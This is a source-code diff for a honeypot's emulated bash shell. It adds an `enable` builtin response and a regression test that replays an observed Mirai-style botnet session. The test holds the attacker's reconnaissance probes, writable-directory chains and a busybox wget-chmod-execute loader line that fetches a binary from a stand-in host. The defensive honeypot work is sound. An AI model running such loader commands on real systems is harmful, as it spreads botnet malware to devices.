@@ -296,6 +296,11 @@ impl FakeShell {
             // `mount` with no arguments lists the same table `/proc/mounts` exposes; mounting
             // something as root is a silent success like the other no-output applets.
             Some("mount") => cmd_mount(parts),
+            // Mirai's telnet preamble is `enable`, `system`, `shell`, `sh`: CLI-escape words for
+            // routers. On the bash this box claims, `enable` is a builtin that lists the enabled
+            // builtins; answering "command not found" for it (observed live 2026-09-06) was the
+            // one reply a bash never gives. `system` and `shell` really are unknown to bash.
+            Some("enable") => cmd_enable(parts),
             Some("wget") => cmd_wget(parts),
             Some("curl") => cmd_curl(parts),
             Some("ping") => cmd_ping(parts),
@@ -860,6 +865,86 @@ fn mode_grants_execute(mode: &str) -> bool {
     mode.contains('x') && !mode.contains('-')
 }
 
+/// bash 5.1's enabled builtins, in the order `enable` prints them.
+const BASH_BUILTINS: [&str; 61] = [
+    ".",
+    ":",
+    "[",
+    "alias",
+    "bg",
+    "bind",
+    "break",
+    "builtin",
+    "caller",
+    "cd",
+    "command",
+    "compgen",
+    "complete",
+    "compopt",
+    "continue",
+    "declare",
+    "dirs",
+    "disown",
+    "echo",
+    "enable",
+    "eval",
+    "exec",
+    "exit",
+    "export",
+    "false",
+    "fc",
+    "fg",
+    "getopts",
+    "hash",
+    "help",
+    "history",
+    "jobs",
+    "kill",
+    "let",
+    "local",
+    "logout",
+    "mapfile",
+    "popd",
+    "printf",
+    "pushd",
+    "pwd",
+    "read",
+    "readarray",
+    "readonly",
+    "return",
+    "set",
+    "shift",
+    "shopt",
+    "source",
+    "suspend",
+    "test",
+    "times",
+    "trap",
+    "true",
+    "type",
+    "typeset",
+    "ulimit",
+    "umask",
+    "unalias",
+    "unset",
+    "wait",
+];
+
+/// bash's `enable` builtin: with no name it lists the enabled builtins as `enable NAME` lines;
+/// enabling or disabling a named builtin prints nothing.
+fn cmd_enable(parts: &[&str]) -> String {
+    if parts[1..].iter().any(|a| !a.starts_with('-')) {
+        return String::new();
+    }
+    let mut out = String::new();
+    for name in BASH_BUILTINS {
+        out.push_str("enable ");
+        out.push_str(name);
+        out.push('\n');
+    }
+    out
+}
+
 /// `mount` with no arguments (or `-l`): util-linux's `source on point type fstype (opts)` lines
 /// from the fake filesystem's one mount table. Any other form is a root mounting something,
 /// which prints nothing on success.
@@ -1362,6 +1447,80 @@ mod shell_detection_tests {
         assert!(!super::mode_grants_execute("644"));
         assert!(super::mode_grants_execute("a+x"));
         assert!(!super::mode_grants_execute("-x"));
+    }
+
+    /// The whole attacker session observed live on 2026-09-06, replayed in order through one
+    /// shell: the Mirai telnet preamble, the two busybox probes, the writable-directory chains,
+    /// and a loader stage. Every reply, the working directory and the emitted events are
+    /// checked, so a line that regresses is caught here even when its own unit test still
+    /// passes. Extend this when a new session line is observed; do not add a narrower test
+    /// instead.
+    #[test]
+    fn observed_session_2026_09_06_replays_end_to_end() {
+        let mut sh = shell();
+        let mut command_events = 0usize;
+        let mut download_urls: Vec<String> = Vec::new();
+        let mut run = |sh: &mut FakeShell, line: &str| -> String {
+            let (out, events) = sh.handle_input(line);
+            for e in &events {
+                match e.signal_type.as_str() {
+                    sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC => command_events += 1,
+                    sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD => download_urls
+                        .push(e.metadata["url"].as_str().unwrap_or_default().to_string()),
+                    _ => {}
+                }
+            }
+            out
+        };
+
+        // Preamble: bash lists its builtins for `enable`; `system`, `shell` and `linuxshell` do
+        // not exist on bash; `sh` opens a nested shell silently.
+        let out = run(&mut sh, "enable");
+        assert!(
+            out.contains("enable cd\n") && !out.contains("not found"),
+            "{out}"
+        );
+        assert_eq!(run(&mut sh, "system"), "bash: system: command not found\n");
+        assert_eq!(run(&mut sh, "shell"), "bash: shell: command not found\n");
+        assert_eq!(
+            run(&mut sh, "linuxshell"),
+            "bash: linuxshell: command not found\n"
+        );
+        assert_eq!(run(&mut sh, "sh"), "");
+
+        // Probes on one line: the listing then the applet reply, in order.
+        assert_eq!(
+            run(&mut sh, "ls /home; /bin/busybox BOTNET"),
+            "ubuntu\nBOTNET: applet not found\n"
+        );
+        let out = run(&mut sh, "cat /proc/mounts; /bin/busybox URUMV");
+        assert!(out.contains("/dev/sda1 / ext4 "), "{out}");
+        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");
+
+        // Writable-directory chains: the marker prints and the shell is left where the chain
+        // ended.
+        let out = run(
+            &mut sh,
+            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
+             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
+             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
+        );
+        assert_eq!(out, "QJLXTK\n");
+        assert_eq!(run(&mut sh, "pwd"), "/var\n");
+        assert_eq!(
+            run(&mut sh, ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"),
+            ""
+        );
+        assert_eq!(run(&mut sh, "pwd"), "/tmp\n");
+
+        // Loader stage: the fetch is quiet, the chmod and run are quiet, and the URL is evidence.
+        let out = run(
+            &mut sh,
+            "/bin/busybox wget http://198.51.100.9/bins/x86 -O x86; chmod 777 x86; ./x86; rm -rf x86",
+        );
+        assert!(!out.contains("not found"), "{out}");
+        assert_eq!(download_urls, vec!["http://198.51.100.9/bins/x86"]);
+        assert_eq!(command_events, 12, "one command event per session line");
     }
 
     /// Observed live (2026-09-06): `cat /proc/mounts; /bin/busybox URUMV`. The box answered
